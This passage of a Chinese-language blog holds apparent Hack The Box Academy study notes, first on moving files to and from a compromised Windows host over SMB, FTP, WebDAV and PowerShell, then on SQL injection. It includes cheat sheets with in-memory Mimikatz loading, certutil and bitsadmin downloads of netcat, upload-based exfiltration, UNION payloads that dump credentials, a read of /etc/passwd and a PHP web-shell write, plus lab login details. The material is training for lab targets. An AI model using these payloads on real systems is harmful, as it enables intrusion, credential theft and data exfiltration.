-smb2support参数用于启用SMB2协议支持，以便客户端可以使用SMB2进行通信。/tmp/smbshare: /tmp/smbshare是指要创建的共享目录的路径，可以根据需要选择不同的路径。通过执行该命令，你创建了一个名为share的SMB共享服务器，并将其设置为支持SMB2协议。共享目录的路径为/tmp/smbshare。其他用户或设备可以通过SMB协议访问这个共享目录，并与其中的文件进行交互。请注意，在运行这个命令之前，确保你已经安装了impacket库，并具有适当的权限来创建共享服务器。</code></pre><p>要将文件从SMB服务器下载到当前工作目录，我们可以使用以下命令：</p><h4 id="Copy-a-File-from-the-SMB-Server"><a href="#Copy-a-File-from-the-SMB-Server" class="headerlink" title="Copy a File from the SMB Server"></a>Copy a File from the SMB Server</h4><pre><code class="cmd-session">C:\htb&gt; copy \\192.168.220.133\share\nc.exe        1 file(s) copied.</code></pre><p>新版本的Windows阻止未经身份验证的访客访问，正如我们在以下命令中看到的：</p><pre><code class="cmd-session">C:\htb&gt; copy \\192.168.220.133\share\nc.exeYou can&#39;t access this shared folder because your organization&#39;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.</code></pre><p>要在这种情况下传输文件，我们可以使用Impacket SMB服务器设置用户名和密码，并在windows目标计算机上装载SMB服务器：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password testImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation</code></pre><h4 id="Mount-the-SMB-Server-with-Username-and-Password"><a href="#Mount-the-SMB-Server-with-Username-and-Password" class="headerlink" title="Mount the SMB Server with Username and Password"></a>Mount the SMB Server with Username and Password</h4><pre><code class="cmd-session">C:\htb&gt; net use n: \\192.168.220.133\share /user:test testThe command completed successfully.C:\htb&gt; copy n:\nc.exe        1 file(s) copied.</code></pre><pre><code class="GPT">这条命令是在 Windows 操作系统上使用的命令，用于映射网络驱动器到指定的共享文件夹。下面是命令的解释和用法：net use n: \\192.168.220.133\share /user:test testnet use: 是 Windows 的一个命令，用于管理网络驱动器映射。n:: 是你想要映射的驱动器号或者驱动器字母。可以选择未使用的字母作为驱动器号。\\192.168.220.133\share: 是你要映射的共享文件夹的路径。在这个例子中，共享文件夹的路径是 \\192.168.220.133\share。/user:test test: 是指定用户名和密码来访问共享文件夹。在这个例子中，用户名和密码都是 test。执行这条命令后，如果用户名和密码正确，系统会尝试将网络驱动器 n: 映射到指定的共享文件夹 \\192.168.220.133\share。如果映射成功，你就可以通过驱动器 n: 来访问共享文件夹中的文件和文件夹。请注意，命令中的 IP 地址和共享文件夹路径需要根据你的实际情况进行修改，确保与你要访问的共享文件夹的地址相匹配。另外，确保提供正确的用户名和密码来进行身份验证。</code></pre><h2 id="FTP-Downloads"><a href="#FTP-Downloads" class="headerlink" title="FTP Downloads"></a>FTP Downloads</h2><p>另一种传输文件的方法是使用FTP（文件传输协议），它使用端口TCP&#x2F;21和TCP&#x2F;20。我们可以使用FTP客户端或PowerShell Net.WebClient从FTP服务器下载文件。 我们可以使用Python3-pyftpdlib模块在攻击主机中配置FTP服务器。可以使用以下命令进行安装： 安装FTP服务器</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo pip3 install pyftpdlib</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ sudo python3 -m pyftpdlib --port 21[I 2022-05-17 10:09:19] concurrency model: async[I 2022-05-17 10:09:19] masquerade (NAT) address: None[I 2022-05-17 10:09:19] passive ports: None[I 2022-05-17 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;</code></pre><p>设置FTP服务器后，我们可以使用Windows或PowerShell Net.WebClient中预装的FTP客户端执行文件传输。</p><h4 id="Transfering-Files-from-an-FTP-Server-Using-PowerShell"><a href="#Transfering-Files-from-an-FTP-Server-Using-PowerShell" class="headerlink" title="Transfering Files from an FTP Server Using PowerShell"></a>Transfering Files from an FTP Server Using PowerShell</h4><pre><code class="powershell-session">PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(&#39;ftp://192.168.49.128/file.txt&#39;, &#39;ftp-file.txt&#39;)</code></pre><p>当我们在远程机器上获得shell时，我们可能没有交互式shell。如果是这种情况，我们可以创建一个FTP命令文件来下载一个文件。首先，我们需要创建一个包含要执行的命令的文件，然后使用FTP客户端使用该文件下载该文件。</p><h4 id="Create-a-Command-File-for-the-FTP-Client-and-Download-the-Target-File"><a href="#Create-a-Command-File-for-the-FTP-Client-and-Download-the-Target-File" class="headerlink" title="Create a Command File for the FTP Client and Download the Target File"></a>Create a Command File for the FTP Client and Download the Target File</h4><pre><code class="cmd-session">C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txtC:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txtC:\htb&gt; echo binary &gt;&gt; ftpcommand.txtC:\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txtC:\htb&gt; echo bye &gt;&gt; ftpcommand.txtC:\htb&gt; ftp -v -n -s:ftpcommand.txtftp&gt; open 192.168.49.128Log in with USER and PASS first.ftp&gt; USER anonymousftp&gt; GET file.txtftp&gt; byeC:\htb&gt;more file.txtThis is a test file</code></pre><h2 id="Upload-Operations"><a href="#Upload-Operations" class="headerlink" title="Upload Operations"></a>Upload Operations</h2><p>还有一些情况，如密码破解、分析、泄露等，我们必须将文件从目标机器上传到攻击主机。我们可以使用与下载操作相同的方法，但现在用于上传。让我们看看如何以各种方式完成文件上传。</p><h2 id="PowerShell-Base64-Encode-amp-Decode-1"><a href="#PowerShell-Base64-Encode-amp-Decode-1" class="headerlink" title="PowerShell Base64 Encode &amp; Decode"></a>PowerShell Base64 Encode &amp; Decode</h2><p>我们看到了如何使用Powershell解码base64字符串。现在，让我们做相反的操作并编码一个文件，这样我们就可以在攻击主机上对其进行解码。</p><h4 id="Encode-File-Using-PowerShell"><a href="#Encode-File-Using-PowerShell" class="headerlink" title="Encode File Using PowerShell"></a>Encode File Using PowerShell</h4><pre><code class="powershell-session">PS C:\htb&gt; [Convert]::ToBase64String((Get-Content -path &quot;C:\Windows\system32\drivers\etc\hosts&quot; -Encoding byte))IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ2&lt;--snip--&gt; gICAgICAgICAgbG9jYWxob3N0DQo=PS C:\htb&gt; Get-FileHash &quot;C:\Windows\system32\drivers\etc\hosts&quot; -Algorithm MD5 | select HashHash----3688374325B992DEF12793500307566D</code></pre><p>我们复制这些内容并将其粘贴到我们的攻击主机中，使用base64命令对其进行解码，并使用md5sum应用程序确认传输是否正确。</p><h2 id="PowerShell-Web-Uploads"><a href="#PowerShell-Web-Uploads" class="headerlink" title="PowerShell Web Uploads"></a>PowerShell Web Uploads</h2><p>PowerShell没有用于上载操作的内置函数，但我们可以使用Invoke-WebRequest或Invoke-RestMethod来构建上载函数。我们还需要一个接受上传的web服务器，这不是大多数常见web服务器实用程序中的默认选项。 对于我们的web服务器，我们可以使用 <a href="https://github.com/Densaugeo/uploadserver">uploadserver</a>，这是 <a href="https://docs.python.org/3/library/http.server.html">HTTP.server module</a>的扩展模块，其中包括一个文件上传页面。让我们安装它并启动Web服务器。</p><h4 id="Installing-a-Configured-WebServer-with-Upload"><a href="#Installing-a-Configured-WebServer-with-Upload" class="headerlink" title="Installing a Configured WebServer with Upload"></a>Installing a Configured WebServer with Upload</h4><pre><code class="shell-session">Tanin@htb[/htb]$ pip3 install uploadserverCollecting upload server  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)Installing collected packages: uploadserverSuccessfully installed uploadserver-2.0.1</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m uploadserverFile upload available at /uploadServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>现在，我们可以使用PowerShell脚本 <a href="https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1">PSUpload.ps1</a>，该脚本使用Invoke-WebRequest来执行上载操作。该脚本接受两个参数-File和-Uri，前者用于指定文件路径，后者用于上传文件的服务器URL。让我们尝试从Windows主机上传主机文件。</p><h4 id="PowerShell-Script-to-Upload-a-File-to-Python-Upload-Server"><a href="#PowerShell-Script-to-Upload-a-File-to-Python-Upload-Server" class="headerlink" title="PowerShell Script to Upload a File to Python Upload Server"></a>PowerShell Script to Upload a File to Python Upload Server</h4><pre><code class="powershell-session">PS C:\htb&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;)PS C:\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373</code></pre><h3 id="PowerShell-Base64-Web-Upload"><a href="#PowerShell-Base64-Web-Upload" class="headerlink" title="PowerShell Base64 Web Upload"></a>PowerShell Base64 Web Upload</h3><p>使用PowerShell和base64编码文件进行上载操作的另一种方法是将Invoke-WebRequest或Invoke-RestMethod与Netcat一起使用。我们使用Netcat来监听我们指定的端口，并将文件作为POST请求发送。最后，我们复制输出并使用base64解码函数将base64字符串转换为文件。</p><pre><code class="powershell-session">PS C:\htb&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path &#39;C:\Windows\System32\drivers\etc\hosts&#39; -Encoding Byte))PS C:\htb&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64</code></pre><h2 id="SMB-Uploads"><a href="#SMB-Uploads" class="headerlink" title="SMB Uploads"></a>SMB Uploads</h2><p>我们之前讨论过，公司通常允许使用HTTP（TCP&#x2F;80）和HTTPS（TCP&#x2F;443）协议进行出站流量。通常，企业不允许SMB协议（TCP&#x2F;445）离开其内部网络，因为这会使他们面临潜在的攻击。有关此方面的更多信息，我们可以阅读Microsoft的文章“防止SMB流量从横向连接进入或离开网络”。 另一种选择是使用WebDav通过HTTP运行SMB。WebDAV（RFC 4918）是HTTP的扩展，HTTP是网络浏览器和网络服务器用来相互通信的互联网协议。WebDAV协议使Web服务器能够像文件服务器一样运行，支持协作内容创作。WebDAV也可以使用HTTPS。 当您使用SMB时，它将首先尝试使用SMB协议进行连接，如果没有可用的SMB共享，它将尝试使用HTTP进行连接。在下面的Wireshark捕获中，我们尝试连接到文件共享测试3，因为它没有发现任何SMB，所以它使用HTTP。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307041620801.png" alt="Image"></p><h4 id="Configuring-WebDav-Server"><a href="#Configuring-WebDav-Server" class="headerlink" title="Configuring WebDav Server"></a>Configuring WebDav Server</h4><p>要设置我们的WebDav服务器，我们需要安装两个Python模块，wsgidav和cheroot（您可以在这里阅读更多关于此实现的信息：<a href="https://github.com/mar10/wsgidav">wsgidav github</a>）。安装它们之后，我们在目标目录中运行wsgidav应用程序。</p><h4 id="Installing-WebDav-Python-modules"><a href="#Installing-WebDav-Python-modules" class="headerlink" title="Installing WebDav Python modules"></a>Installing WebDav Python modules</h4><pre><code class="shell-session">sudo pip install wsgidav cheroot</code></pre><pre><code class="shell-session">sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous [sudo] password for plaintext: Running without configuration file.10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.3110:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)10:02:53.950 - INFO    : Property manager:  None10:02:53.950 - INFO    : Domain controller: SimpleDomainController()10:02:53.950 - INFO    : Registered DAV providers by route:10:02:53.950 - INFO    :   - &#39;/:dir_browser&#39;: FilesystemProvider for path &#39;/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs&#39; (Read-Only) (anonymous)10:02:53.950 - INFO    :   - &#39;/&#39;: FilesystemProvider for path &#39;/tmp&#39; (Read-Write) (anonymous)10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.10:02:53.950 - WARNING : Share &#39;/&#39; will allow anonymous write access.10:02:53.950 - WARNING : Share &#39;/:dir_browser&#39; will allow anonymous read access.10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.210:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...</code></pre><h4 id="Connecting-to-the-Webdav-Share"><a href="#Connecting-to-the-Webdav-Share" class="headerlink" title="Connecting to the Webdav Share"></a>Connecting to the Webdav Share</h4><p>现在我们可以尝试使用DavWWWRoot目录连接到共享。</p><p>注意：DavWWWRoot是一个由Windows Shell识别的特殊关键字。您的WebDAV服务器上不存在这样的文件夹。DavWWWRoot关键字告诉Mini-Redirector驱动程序，该驱动程序处理您正在连接到WebDAV服务器根目录的WebDAV请求。 如果在连接到服务器时指定了服务器上存在的文件夹，则可以避免使用此关键字。例如：\192.168.49.128\sharefolder</p><h4 id="Uploading-Files-using-SMB"><a href="#Uploading-Files-using-SMB" class="headerlink" title="Uploading Files using SMB"></a>Uploading Files using SMB</h4><pre><code class="cmd-session">C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\</code></pre><p>注意：如果没有SMB（TCP&#x2F;445）限制，您可以使用impacket-smbserver，方法与我们为下载操作设置的方法相同。</p><h2 id="FTP-Uploads"><a href="#FTP-Uploads" class="headerlink" title="FTP Uploads"></a>FTP Uploads</h2><p>使用FTP上传文件与下载文件非常相似。我们可以使用PowerShell或FTP客户端来完成操作。在使用Python模块pyftpdlib启动FTP服务器之前，我们需要指定选项–write，以允许客户端将文件上传到我们的攻击主机。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.  warnings.warn(&quot;write permissions assigned to anonymous user.&quot;,[I 2022-05-18 10:33:31] concurrency model: async[I 2022-05-18 10:33:31] masquerade (NAT) address: None[I 2022-05-18 10:33:31] passive ports: None[I 2022-05-18 10:33:31] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=5155 &lt;&lt;&lt;</code></pre><p>现在，让我们使用PowerShell上载功能将文件上载到FTP服务器。</p><pre><code class="powershell-session">PS C:\htb&gt; (New-Object Net.WebClient).UploadFile(&#39;ftp://192.168.49.128/ftp-hosts&#39;, &#39;C:\Windows\System32\drivers\etc\hosts&#39;)</code></pre><h4 id="Create-a-Command-File-for-the-FTP-Client-to-Upload-a-File"><a href="#Create-a-Command-File-for-the-FTP-Client-to-Upload-a-File" class="headerlink" title="Create a Command File for the FTP Client to Upload a File"></a>Create a Command File for the FTP Client to Upload a File</h4><pre><code class="cmd-session">C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txtC:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txtC:\htb&gt; echo binary &gt;&gt; ftpcommand.txtC:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txtC:\htb&gt; echo bye &gt;&gt; ftpcommand.txtC:\htb&gt; ftp -v -n -s:ftpcommand.txtftp&gt; open 192.168.49.128Log in with USER and PASS first.ftp&gt; USER anonymousftp&gt; PUT c:\windows\system32\drivers\etc\hostsftp&gt; bye</code></pre><h2 id="备忘："><a href="#备忘：" class="headerlink" title="备忘："></a>备忘：</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></td><td>使用 PowerShell 下载文件</td></tr><tr><td><code>IEX (New-Object Net.WebClient).DownloadString(&#39;https://&lt;snip&gt;/Invoke-Mimikatz.ps1&#39;)</code></td><td>使用 PowerShell 在内存中执行文件</td></tr><tr><td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td><td>使用 PowerShell 上传文件</td></tr><tr><td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td><td>使用 Bitsadmin 下载文件</td></tr><tr><td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td><td>使用 Certutil 下载文件</td></tr><tr><td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td><td>使用 Wget 下载文件</td></tr><tr><td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td><td>使用 cURL 下载文件</td></tr><tr><td><code>php -r &#39;$file = file_get_contents(&quot;https://&lt;snip&gt;/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</code></td><td>使用 PHP 下载文件</td></tr><tr><td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td><td>使用 SCP 上传文件</td></tr><tr><td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td><td>使用 SCP 下载文件</td></tr><tr><td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile &quot;nc.exe&quot;</code></td><td>使用 Chrome 用户代理的 Invoke-WebRequest</td></tr></tbody></table><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><pre><code>target:10.129.201.55RDP 到目标。使用您选择的方法将名为 upload_win.zip 的附加文件上传到目标。上传后，RDP 到框，解压缩存档，然后从命令行运行“哈希upload_win.txt”。提交生成的哈希作为答案。</code></pre><p>先连接一下：</p><p><code>xfreerdp /v:10.129.201.55 /u:htb-student /p:HTB_@cademy_stdnt! </code></p><p>这里练习一下各种上传方法：</p><h3 id="smb："><a href="#smb：" class="headerlink" title="smb："></a>smb：</h3><p>搭建服务器</p><pre><code># impacket-smbserver share -smb2support /home/tanin/test </code></pre><p>下载：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307041709894.png" alt="image-20230704170935108"></p><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>搭建服务器：</p><pre><code>python3 -m pyftpdlib --port 21</code></pre><p>下载：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307041715278.png" alt="image-20230704171535023"></p><p>也可以直接匿名ftp连接：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307041721880.png" alt="image-20230704172144763"></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql</title>
      <link href="/2023/06/26/sql/"/>
      <url>/2023/06/26/sql/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.sqlinjection.net/stacked-queries/">stacked</a></p><p><a href="https://www.mysqltutorial.org/sql-union-mysql.aspx/">Union</a></p><p>一旦攻击者能够注入，他们就必须寻找执行不同SQL查询的方法。这可以使用SQL代码来组成一个工作查询，该查询同时执行预期的和新的SQL查询。有很多方法可以实现这一点，比如使用堆叠查询或使用联合查询。最后，为了检索新查询的输出，我们必须在web应用程序的前端对其进行解释或捕获。</p><span id="more"></span><h2 id="SQLi-Discovery"><a href="#SQLi-Discovery" class="headerlink" title="SQLi Discovery"></a>SQLi Discovery</h2><p>在我们开始颠覆web应用程序的逻辑并试图绕过身份验证之前，我们首先必须测试登录表单是否容易受到SQL注入的攻击。要做到这一点，我们将尝试在用户名后添加以下有效载荷之一，看看它是否会导致任何错误或改变页面的行为：</p><table><thead><tr><th><code>&#39;</code></th><th><code>%27</code></th></tr></thead><tbody><tr><td><code>&quot;</code></td><td><code>%22</code></td></tr><tr><td><code>#</code></td><td><code>%23</code></td></tr><tr><td><code>;</code></td><td><code>%3B</code></td></tr><tr><td><code>)</code></td><td><code>%29</code></td></tr></tbody></table><p>注意：在某些情况下，我们可能不得不使用URL编码的有效载荷版本。这方面的一个例子是，我们将有效负载直接放在URL“即HTTP GET请求”中。</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>常规</strong></td><td></td></tr><tr><td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td><td>登录 MySQL 数据库</td></tr><tr><td><code>SHOW DATABASES</code></td><td>列出可用数据库</td></tr><tr><td><code>USE users</code></td><td>切换到数据库</td></tr><tr><td><strong>表</strong></td><td></td></tr><tr><td><code>CREATE TABLE logins (id INT, ...)</code></td><td>添加新表</td></tr><tr><td><code>SHOW TABLES</code></td><td>列出当前数据库中的可用表</td></tr><tr><td><code>DESCRIBE logins</code></td><td>显示表属性和列</td></tr><tr><td><code>INSERT INTO table_name VALUES (value_1,..)</code></td><td>向表中添加值</td></tr><tr><td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td><td>向表中的特定列添加值</td></tr><tr><td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td><td>更新表值</td></tr><tr><td><strong>列</strong></td><td></td></tr><tr><td><code>SELECT * FROM table_name</code></td><td>显示表中的所有列</td></tr><tr><td><code>SELECT column1, column2 FROM table_name</code></td><td>显示表中的特定列</td></tr><tr><td><code>DROP TABLE logins</code></td><td>删除表</td></tr><tr><td><code>ALTER TABLE logins ADD newColumn INT</code></td><td>添加新列</td></tr><tr><td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td><td>重命名列</td></tr><tr><td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td><td>更改列数据类型</td></tr><tr><td><code>ALTER TABLE logins DROP oldColumn</code></td><td>删除列</td></tr><tr><td><strong>输出</strong></td><td></td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1</code></td><td>按列排序</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td><td>按列降序排序</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td><td>按两列排序</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2</code></td><td>仅显示前两个结果</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2</code></td><td>仅显示从索引 2 开始的前两个结果</td></tr><tr><td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td><td>列出满足条件的结果</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></td><td>列出名称类似于给定字符串的结果</td></tr></tbody></table><h2 id="MySQL-运算符优先级"><a href="#MySQL-运算符优先级" class="headerlink" title="MySQL 运算符优先级"></a>MySQL 运算符优先级</h2><ul><li>除法 （）、乘法 （） 和模数 （<code>/``*``%</code>)</li><li>加法 （） 和减法 （<code>+``-</code>)</li><li>比较 （， ， ， ， ， ， ，<code>=``&gt;``&lt;``&lt;=``&gt;=``!=``LIKE</code>)</li><li>不是 （<code>!</code>)</li><li>和 （<code>&amp;&amp;</code>)</li><li>或 （<code>||</code>)</li></ul><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><table><thead><tr><th><strong>有效载荷</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>身份验证旁路</strong></td><td></td></tr><tr><td><code>admin&#39; or &#39;1&#39;=&#39;1</code></td><td>基本身份验证绕过</td></tr><tr><td><code>admin&#39;)-- -</code></td><td>带注释的基本身份验证绕过</td></tr><tr><td>[身份验证绕过有效负载](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL</a> Injection#authentication-bypass)</td><td></td></tr><tr><td><strong>联合注射</strong></td><td></td></tr><tr><td><code>&#39; order by 1-- -</code></td><td>使用 检测列数<code>order by</code></td></tr><tr><td><code>cn&#39; UNION select 1,2,3-- -</code></td><td>使用联合进样检测列数</td></tr><tr><td><code>cn&#39; UNION select 1,@@version,3,4-- -</code></td><td>基本联合注射</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td><td>4 列联合进样</td></tr><tr><td><strong>数据库枚举</strong></td><td></td></tr><tr><td><code>SELECT @@version</code></td><td>具有查询输出的指纹 MySQL</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>没有输出的指纹MySQL</td></tr><tr><td><code>cn&#39; UNION select 1,database(),2,3-- -</code></td><td>当前数据库名称</td></tr><tr><td><code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td><td>列出所有数据库</td></tr><tr><td><code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></td><td>列出特定数据库中的所有表</td></tr><tr><td><code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></td><td>列出特定表中的所有列</td></tr><tr><td><code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></td><td>从另一个数据库中的表中转储数据</td></tr><tr><td><strong>特权</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, user(), 3, 4-- -</code></td><td>查找当前用户</td></tr><tr><td><code>cn&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></td><td>查找用户是否具有管理员权限</td></tr><tr><td><code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></td><td>查找是否所有用户权限</td></tr><tr><td><code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></td><td>查找可以通过 MySQL 访问的目录</td></tr><tr><td><strong>文件注入</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></td><td>读取本地文件</td></tr><tr><td><code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></td><td>将字符串写入本地文件</td></tr><tr><td><code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></td><td>将 Web 外壳写入基本 Web 目录</td></tr></tbody></table><p>检测列数的第一种方法是通过ORDERBY函数，我们前面已经讨论过了。我们必须注入一个查询，该查询根据我们指定的列对结果进行排序，“即，列1、列2等”，直到我们收到一个错误，表明指定的列不存在。 例如，我们可以从order by 1开始，按第一列排序，然后成功，因为表必须至少有一列。然后，我们将按2排序，然后按3排序，直到到达返回错误的数字，或者页面没有显示任何输出，这意味着该列编号不存在。我们成功排序的最后一个成功列给出了列的总数。</p><p>另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功地返回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。</p><pre><code class="sql">cn&#39; UNION select 1,2,3-- -</code></pre><p>不是每一列都会显示给用户，这是非常常见的。例如，ID字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们，打印第2列和第3列以及第4列是为了将我们的注入放在其中任何一列中。我们不能把我们的注入放在一开始，否则它的输出将不会打印出来。 这就是使用数字作为垃圾数据的好处，因为它可以很容易地跟踪打印的列，这样我们就知道要将查询放在哪一列。为了测试我们是否可以从数据库“而不仅仅是数字”中获得实际数据，我们可以使用@@version SQL查询作为测试，并将其放在第二列，而不是数字2：</p><pre><code class="sql">cn&#39; UNION select 1,@@version,3,4-- -</code></pre><p>在枚举数据库之前，我们通常需要确定我们正在处理的DBMS的类型。这是因为每个DBMS都有不同的查询，知道它是什么将有助于我们知道要使用什么查询。 作为最初的猜测，如果我们在HTTP响应中看到的Web服务器是Apache或Nginx，那么很好的猜测是该Web服务器运行在Linux上，因此DBMS很可能是MySQL。如果Web服务器是IIS，那么这同样适用于Microsoft DBMS，因此它很可能是MSSQL。然而，这是一个牵强的猜测，因为许多其他数据库可以在操作系统或web服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。</p><p>MySQL：</p><table><thead><tr><th>Payload</th><th>When to Use</th><th>Expected Output</th><th>Wrong Output</th></tr></thead><tbody><tr><td><code>SELECT @@version</code></td><td>When we have full query output</td><td>MySQL Version ‘i.e. <code>10.3.22-MariaDB-1ubuntu1</code>‘</td><td>In MSSQL it returns MSSQL version. Error with other DBMS.</td></tr><tr><td><code>SELECT POW(1,1)</code></td><td>When we only have numeric output</td><td><code>1</code></td><td>Error with other DBMS</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Blind&#x2F;No Output</td><td>Delays page response for 5 seconds and returns <code>0</code>.</td><td>Will not delay response with other DBMS</td></tr></tbody></table><h4 id="INFORMATION-SCHEMA"><a href="#INFORMATION-SCHEMA" class="headerlink" title="INFORMATION_SCHEMA"></a><a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html">INFORMATION_SCHEMA</a></h4><p>要使用UNIONSELECT从表中提取数据，我们需要正确地形成SELECT查询。为此，我们需要以下信息： 数据库列表 每个数据库中的表列表 每个表中的列列表 有了以上信息，我们可以形成SELECT语句来转储DBMS内任何数据库中任何表中任何列的数据。这就是我们可以利用INFORMATION_SCHEMA数据库的地方。 